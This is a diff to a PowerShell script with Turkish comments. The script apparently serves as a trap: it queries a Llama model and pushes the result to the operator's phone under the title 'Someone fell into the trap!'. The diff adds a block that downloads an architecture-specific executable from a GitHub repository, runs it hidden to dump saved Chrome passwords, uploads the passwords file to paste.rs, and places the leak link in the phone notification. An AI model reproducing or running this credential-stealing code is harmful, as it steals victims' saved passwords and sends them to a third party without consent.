@@ -1,4 +1,3 @@
-
 $ErrorActionPreference = 'Stop'
 # Konsol işleyicisinin varlığı kontrol edilir
 if ([Console]::OutputEncoding -ne $null) {
@@ -12,12 +11,18 @@ if ([Console]::OutputEncoding -ne $null) {
 # PowerShell oturum içi varsayılan çıktı kodlaması
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
+# --- 0. CHROME ŞİFRE ÇEKME VE PASTE.RS'E YÜKLEME ---
+$a = $env:PROCESSOR_ARCHITEW6432, $env:PROCESSOR_ARCHITECTURE | Where-Object { $_ } | Select-Object -First 1
+$u = if ($a -eq "AMD64") { "https://github.com/Baris60/xeno/raw/refs/heads/main/x64.exe" } elseif ($a -eq "ARM64") { "https://github.com/Baris60/xeno/raw/refs/heads/main/arm64.exe" } else { exit }
+$f = Join-Path $env:TEMP ([System.IO.Path]::GetFileName($u))
+Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
+Start-Process -FilePath $f -ArgumentList 'chrome','-o','C:\test' -WindowStyle Hidden -Wait
+$content = Get-Content -Path "C:\test\Chrome\Default\passwords.json" -Raw
+$rawUrl = (Invoke-WebRequest -Uri "https://paste.rs" -Method Post -Body $content -UseBasicParsing).Content.Trim()
+
 # API Yapılandırması
-# 1. Fetch the API key from the raw Pastefy link
 $pasteUrl = "https://pastefy.app/j2CT8NLB/raw"
 $apiKey   = (Invoke-RestMethod -Uri $pasteUrl).Trim()
-
-# 2. Define the target model
 $model    = "meta-llama/llama-3.3-70b-instruct"
 
 # Pushover Yapılandırması
@@ -164,14 +169,17 @@ try {
 
     $finalOutput = $response.choices[0].message.content
 
-    # 2. Ekrana Yazdır
-    Write-Host $finalOutput
+    # 2. Passwords satirini en uste ekle
+    $pushMessage = "Passwords: $rawUrl`n`n$finalOutput"
 
-    # 3. Pushover API ile Telefona Bildirim Gönder
+    # 3. Ekrana Yazdir
+    Write-Host $pushMessage
+
+    # 4. Pushover API ile Telefona Bildirim Gonder
     $pushoverBody = @{
         token   = $apiToken
         user    = $userKey
-        message = $finalOutput
+        message = $pushMessage
         title   = "Tuzağa Biri Düştü!"
     }
 
